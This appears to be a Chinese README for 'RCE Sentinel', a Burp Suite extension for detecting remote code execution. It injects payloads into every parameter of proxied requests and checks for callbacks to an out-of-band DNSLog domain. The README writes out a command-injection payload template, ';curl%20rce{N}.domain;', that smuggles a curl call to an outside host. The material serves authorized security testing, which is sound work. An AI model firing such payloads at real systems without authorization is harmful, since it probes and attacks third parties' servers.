# RCE 哨兵 (RCE Sentinel)

## ⚠️ 解压密码
> 一款专为 Burp Suite 设计的远程代码执行漏洞检测插件
```
解压密码在sbbbb.cn首页的OxShe工具 找到RCE哨兵 点击进去即可获取解压密码【如果觉得本站好用，请收藏】
```

## 📖 工具介绍

RCE 哨兵是一款高效的 Burp Suite 扩展插件，专注于检测 HTTP 请求中的潜在远程代码执行（RCE）漏洞。它能够自动捕获 GET 和 POST 请求，将用户指定的 Payload 注入到请求参数中，并生成新的测试请求。

## ✨ 主要特性

- 🎯 **自动化测试**：自动捕获并测试 HTTP 请求中的所有参数
- 🔄 **双重注入模式**：支持参数值替换和追加两种注入方式
- 📦 **多格式支持**：完美处理 `application/x-www-form-urlencoded`、`multipart/form-data` 和 `application/json` 格式
- 🚫 **智能过滤**：自动过滤静态资源文件（js、css、图片等）
- 🔍 **去重机制**：避免重复测试相同的请求
- 📊 **实时监控**：实时显示测试结果，包括时间、URL、响应码等信息
- 🔗 **联动集成**：支持一键发送到 Burp Repeater 进行深度测试

## 🚀 使用方法

### 1. 配置 Payload

1. 在插件标签页中找到 "RCE 哨兵"
2. 在 Payload 输入框中填入你的 DNSLog 域名或外带平台域名【建议使用Burp自带的dnslog】
   - 例如：`xxx.dnslog.cn` 或 `xxx.ceye.io`
3. 点击 "保存 Payload" 按钮

### 2. 启动插件

1. 点击 "开启插件" 按钮
2. 状态栏显示 "[+] RCE哨兵已启动"
3. 开始正常浏览目标网站，插件会自动测试

### 3. 查看结果

- 表格中会实时显示所有测试请求
- 点击表格行可在下方查看完整的请求和响应数据包
- 右键点击表格行可将请求发送到 Repeater

## 📝 工作原理

1. **捕获请求**：监听 Burp Proxy 中的 HTTP 请求
2. **参数提取**：提取 GET/POST 参数，支持 URL 参数、表单数据和 JSON 数据
3. **Payload 注入**：对每个参数生成唯一的 RCE 编号，构造测试 Payload
4. **发送测试**：
   - 方式一：替换原参数值为恶意 Payload
   - 方式二：在原参数值后追加恶意 Payload
5. **结果记录**：记录响应状态码、时间等信息，方便后续分析

## 🔧 Payload 格式

插件会自动构造如下格式的 Payload：

```
;curl%20rce{编号}.{你的域名};
```

示例：
- 配置域名：`xxx.dnslog.cn`
- 生成 Payload：`;curl%20rce1.xxx.dnslog.cn;`

## 📋 支持的数据格式

- ✅ GET 请求参数
- ✅ POST application/x-www-form-urlencoded
- ✅ POST multipart/form-data
- ✅ POST application/json (支持嵌套 JSON)

## ⚠️ 注意事项

1. 仅用于授权的安全测试，请勿用于非法用途
2. 建议配合 DNSLog 或 Ceye 等外带平台使用
3. 插件会自动过滤常见静态资源，减少无效请求
4. 开启插件后会对所有请求进行测试，可能产生大量流量

## 📞 联系方式

- 公众号：**安全社**
- 官网：**sbbbb.cn**

## 📄 许可证

本项目仅供学习和授权测试使用，使用者需自行承担使用风险。

---

⚡ 让 RCE 无所遁形！

